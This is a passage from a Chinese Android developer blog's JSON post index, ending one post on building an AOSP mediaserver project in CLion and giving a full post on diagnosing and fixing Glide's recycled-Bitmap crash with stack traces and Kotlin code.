12345678910111213============================================PLATFORM_VERSION_CODENAME=RELPLATFORM_VERSION=11TARGET_PRODUCT=aosp_armTARGET_BUILD_VARIANT=engTARGET_BUILD_TYPE=releaseTARGET_ARCH=armTARGET_ARCH_VARIANT=armv7-a-neonTARGET_CPU_VARIANT=generic......============================================......[100% 4951/4951] Install: out/target/product/generic/system/bin/mediaserver 导入 CLion1234$ ls -l out/development/ide/clion/frameworks/av/media/mediaserver/mediaserver-arm-androidtotal 44drwxrwxr-x 4 shumxin shumxin 4096 8月 13 23:35 cmake-build-mediaserver-rw-rw-r-- 1 shumxin shumxin 40090 8月 13 23:28 CMakeLists.txt 在一个项目里面整合多个源码目录比如想看 mediaserver 相关的 Native 代码，其有涉及到其他模块，可以重新创建一个 CMakeList.txt 放在 out/development/ide/clion/frameworks 下，将相关模块整合进来，如下： 123456cmake_minimum_required(VERSION 3.6)project(frameworks)add_subdirectory(av/media/libmediaplayerservice/libmediaplayerservice-arm-android)add_subdirectory(av/media/mediaserver/mediaserver-arm-android)add_subdirectory(native/cmds/servicemanager/servicemanager-arm-android)add_subdirectory(native/libs/binder/libbinder-arm-android)","categories":["android"]},{"title":"Glide 资源重用错误 - Cannot draw a recycled Bitmap","path":"/2021/06/26/glide-resource-re-use-error/","content":"问题描述背景最近看了我司某产品的 Bugly 上的崩溃分析统计，注意到 Canvas: trying to use a recycled bitmap android.graphics.Bitmap@e9a8c74 异常有点醒目。 问题调用栈12345678910111213141516171819202122232425java.lang.RuntimeException: Canvas: trying to use a recycled bitmap android.graphics.Bitmap@de87ba3 at android.graphics.BaseCanvas.throwIfCannotDraw(BaseCanvas.java:66) at android.graphics.MiuiCanvas.throwIfCannotDraw(MiuiCanvas.java:329) at android.graphics.RecordingCanvas.throwIfCannotDraw(RecordingCanvas.java:277) at android.graphics.BaseRecordingCanvas.drawBitmap(BaseRecordingCanvas.java:88) at app.abk.draw(SourceFile:101) at android.widget.ImageView.onDraw(ImageView.java:1436) at android.view.View.draw(View.java:22489) at android.view.View.updateDisplayListIfDirty(View.java:21357) at android.view.View.draw(View.java:22217) at android.view.ViewGroup.drawChild(ViewGroup.java:4540) at android.view.ViewGroup.dispatchDraw(ViewGroup.java:4299) at android.view.View.updateDisplayListIfDirty(View.java:21348) at android.view.View.draw(View.java:22217) at android.view.ViewGroup.drawChild(ViewGroup.java:4540) at android.view.ViewGroup.dispatchDraw(ViewGroup.java:4299) at android.view.View.draw(View.java:22492) at android.view.View.updateDisplayListIfDirty(View.java:21357) at android.view.View.draw(View.java:22217) at android.view.ViewGroup.drawChild(ViewGroup.java:4540) at android.view.ViewGroup.dispatchDraw(ViewGroup.java:4299) at android.widget.AbsListView.dispatchDraw(AbsListView.java:2705) at android.view.View.draw(View.java:22492) at android.widget.AbsListView.draw(AbsListView.java:4448) ... 查看对应版本的 mapping 文件确认 app.abk 对应 com.bumptech.glide.load.resource.bitmap.GlideBitmapDrawable 问题分析提取主要信息正常来说根据异常信息的堆栈很容易定位到相关业务代码的出错位置，而该堆栈信息乍一看有点懵 首先对于 Canvas: trying to use a recycled bitmap android.graphics.Bitmap@xxxxxxxx； 1234567891011protected void throwIfCannotDraw(Bitmap bitmap) &#123; if (bitmap.isRecycled()) &#123; throw new RuntimeException(&quot;Canvas: trying to use a recycled bitmap &quot; + bitmap); &#125; if (!bitmap.isPremultiplied() &amp;&amp; bitmap.getConfig() == Bitmap.Config.ARGB_8888 &amp;&amp; bitmap.hasAlpha()) &#123; throw new RuntimeException(&quot;Canvas: trying to use a non-premultiplied bitmap &quot; + bitmap); &#125; throwIfHwBitmapInSwMode(bitmap);&#125; 原因是 ImageView#onDraw 的时候尝试使用已回收的 bitmap 进而造成该崩溃。 知道上述原因对问题的分析无实质性帮助，根据 com.bumptech.glide.load.resource.bitmap.GlideBitmapDrawable 信息首先可以确认是用到 Glide 加载图片相关的业务代码，堆栈信息中有 AbsListView 可以确认和其相关子类的控件有关，如 ListView 和 GridView。结合这两点能很快确认和某一块的业务代码相关。 检索类似异常既然和 Glide 相关，所以直接去 github 上 glide 的官方项目检索相关 issue，发现该问题的反馈还挺多，查看了几个类似问题后最终指向了官方关于常见错误一个说明文档 common-errors 其中关于 Cannot draw a recycled Bitmap 官方的说明如下 Glide 的 BitmapPool 是固定大小的。当 Bitmap 从中被踢出而没有被重用时，Glide 将会调用 recycle()。如果应用在向 Glide 指出可以安全地回收之后 “不经意间” 继续持有 Bitmap，则应用可能尝试绘制这个 Bitmap，进而在 onDraw 方法中造成崩溃。一种可能的情况是，一个目标被用于两个 ImageView，而其中一个在 Bitmap 被放到 BitmapPool 中后仍然试图访问被回收后的 Bitmap。基于以下因素，要复现这种复用错误可能很困难：1）Bitmap 何时被放入池中，2）Bitmap 何时被回收，3）何种尺寸的 BitmapPool 和内存缓存会导致 Bitmap 的回收。可以在你的 GlideModule中加入下面的代码片段，以使这个问题更容易复现： 1234567@Overridepublic void applyOptions(Context context, GlideBuilder builder) &#123; int bitmapPoolSizeBytes = 1024 * 1024 * 0; // 0mb int memoryCacheSizeBytes = 1024 * 1024 * 0; // 0mb builder.setMemoryCache(new LruResourceCache(memoryCacheSizeBytes)); builder.setBitmapPool(new LruBitmapPool(bitmapPoolSizeBytes));&#125; 上面的代码确保没有内存缓存，且 BitmapPool 的尺寸为 0；因此 Bitmap 如果恰好没有被使用，它将立刻被回收。这是为了调试目的让它更快出现。 尝试复现结合上述说明我们可以尝试在项目代码里面对怀疑的地方进行相关日志添加再模拟场景尝试复现。实际的业务代码场景入手其实可以先定位大致位置，尝试触发大量图片加载触发 Glide BitmapPool 进行资源回收后来进行场景复现。这里我就简单通过 Demo 来复现该崩溃。 首先按照官网说明配置 MemoryCache 和 BitmapPool 大小为 0 123456789101112131415@GlideModuleclass MyAppGlideModule : AppGlideModule() &#123; override fun applyOptions(context: Context, builder: GlideBuilder) &#123; val bitmapPoolSizeBytes = 1024 * 1024 * 0 // 0mb val memoryCacheSizeBytes = 1024 * 1024 * 0 // 0mb builder.setMemoryCache(LruResourceCache(memoryCacheSizeBytes.toLong())) builder.setBitmapPool(LruBitmapPool(bitmapPoolSizeBytes.toLong())) builder.setLogLevel(Log.VERBOSE) &#125; override fun isManifestParsingEnabled(): Boolean &#123; return false &#125;&#125; 需要注意的一点是: 如果你在 Kotlin 编写的类里使用 Glide 注解，你需要引入一个 kapt 依赖，以代替常规的 annotationProcessor 依赖。见下载和设置 Demo 尝试复现首次实现如下： 123override fun onBindViewHolder(holder: ViewHolder, position: Int) &#123; Glide.with(holder.imageView.context).load(dataSet[position]).into(holder.imageView)&#125; 发现一直无法复现相应崩溃场景，虽然在此之前已修复对应我司产品项目中的崩溃问题。看到这篇 Blog 后才发现当时虽然解决了问题，但是深挖的还不够。 如该博主所说，当使用 into(imageView) 的方式加载图片，不会抛出异常。into(imageView) 的方式后面会setResourceInternal(null)，最终会调用到 ImageView.setImageDrawable(null)。这样在 ImageView onDraw 时判断 mDrawable == null 时直接返回了。 12345678910@Overrideprotected void onDraw(Canvas canvas) &#123; super.onDraw(canvas); if (mDrawable == null) &#123; return; // couldn&#x27;t resolve the URI &#125; ...&#125; 当使用 into(Target) 的方式则可能会导致抛出该异常，看了下我们的项目代码确实最终封装用到的是 SimpleTarget。 12345678910111213141516171819override fun onBindViewHolder(holder: ViewHolder, position: Int) &#123; Glide.with(holder.imageView.context).load(dataSet[position]) .into(object : CustomViewTarget&lt;View, Drawable&gt;(holder.imageView) &#123; override fun onLoadFailed(errorDrawable: Drawable?) &#123; &#125; override fun onResourceReady( resource: Drawable, transition: Transition&lt;in Drawable&gt;? ) &#123; holder.imageView.setImageDrawable(resource) &#125; override fun onResourceCleared(placeholder: Drawable?) &#123; &#125; &#125;)&#125; 使用 into(target) 的方式复现了该崩溃 123456789101112io.github.shumxin.glideresreuseerror E/AndroidRuntime: FATAL EXCEPTION: main Process: io.github.shumxin.glideresreuseerror, PID: 23165 java.lang.RuntimeException: Canvas: trying to use a recycled bitmap android.graphics.Bitmap@3b85e5e at android.graphics.BaseCanvas.throwIfCannotDraw(BaseCanvas.java:66) at android.graphics.RecordingCanvas.throwIfCannotDraw(RecordingCanvas.java:277) at android.graphics.BaseRecordingCanvas.drawBitmap(BaseRecordingCanvas.java:88) at android.graphics.drawable.BitmapDrawable.draw(BitmapDrawable.java:548) at android.widget.ImageView.onDraw(ImageView.java:1436) at android.view.View.draw(View.java:22350) at android.view.View.updateDisplayListIfDirty(View.java:21226) at android.view.View.draw(View.java:22081) ... 原因分析这里 ImageView 在 onDraw 阶段用到的 mDrawable 实际是 BitmapDrawable，其持有了对应的 Bitmap 对象，该 Bitmap 对象在 Glide 的 LruBitmapPool#put 方法中当不满足缓存条件时则会调用 bitmap.recycle() 进行回收。RecyclerView 滑动时当出现 ViewHolder 复用时，新的图片资源还未获取到时，该 ViewHolder 中的 ImageView 用之前请求的图片资源进行绘制时，对应该图片资源的 mDrawable 中的 Bitmap 已经被回收，遂会抛出该异常。 解决方案结合原因分析，最初我在工程项目里面的实现方案则是通过对崩溃的地方的自定义 ImageView，并对其 onDraw() 方法进行重写。判断如果当前持有的 mDrawable 是 BitmapDrawable，当其持有的 bitmap.isRecycled，则不触发最终的绘制操作。 12345678910override fun onDraw(canvas: Canvas?) &#123; if (drawable is BitmapDrawable) &#123; (drawable as BitmapDrawable).bitmap?.let &#123; if (it.isRecycled) &#123; return &#125; &#125; &#125; super.onDraw(canvas)&#125; 上述方式可以解决该问题，但是其中的一个缺陷是需要知道哪些类型的 drawable 会持有 bitmap，比如 3.x 版本的 Glide 有 GlideBitmapDrawable，其内部也持有 bitmap，对于上述的处理就需要再增加一个分支处理。 那有没有更合适的方式来处理该问题呢，对于实现 CustomViewTarget 中 onLoadFailed(@Nullable Drawable errorDrawable)、onResourceReady(@NonNull R resource, @Nullable Transition&lt;? super R&gt; transition)、onResourceCleared(@Nullable Drawable placeholder) 三个方法时，其中 onResourceCleared 很容易被忽略。 关于 onResourceCleared(@Nullable Drawable placeholder) 的说明如下 A required callback invoked when the resource is no longer valid and must be freed. You must ensure that any current Drawable received in onResourceReady(Object, Transition) is no longer used before redrawing the container (usually a View) or changing its visibility. Not doing so will result in crashes in your app. onResourceCleared(@Nullable Drawable placeholder) 是由 onLoadCleared(@Nullable Drawable placeholder) 调用 关于 onLoadCleared(@Nullable Drawable placeholder) 的说明如下 A mandatory lifecycle callback that is called when a load is cancelled and its resources are freed.You must ensure that any current Drawable received in onResourceReady(Object, Transition) is no longer used before redrawing the container (usually a View) or changing its visibility. 再看下官方文档相关的说明 链接 往Target中加载资源，清除或重用Target，并继续引用该资源 最简单的比较这个错误的办法是确保所有对资源的引用都在 onLoadCleared() 调用时置空。通常，加载一个 Bitmap 然后对 Target 解引用，并且不要再次调用 into() 或 clear()，这样是安全的。然而，加载了一个 Bitmap，清除这个 Target，并在之后继续持有 Bitmap 引用是不安全的。类似地，加载资源到一个 View 上然后从 View 中获取这个资源 (通过 getImageDrawable() 或任何其他手段)，并在其他某个地方继续引用它，也是不安全的。 当 Glide 回调 onResourceCleared 后即准备将相关的 bitmap 进行回收，所以我们只需要在 onResourceCleared 的时候主动 setImageDrawable(null) 不再持有接下来将被回收的 Bitmap 即可解决问题 123override fun onResourceCleared(placeholder: Drawable?) &#123; holder.imageView.setImageDrawable(null)&#125; 参考 [1] Glide Resource Reuse [2] Glide 导致的 RuntimeException: Canvas: trying to use a recycled bitmap android.graphics.Bitmap","categories":["android"]}]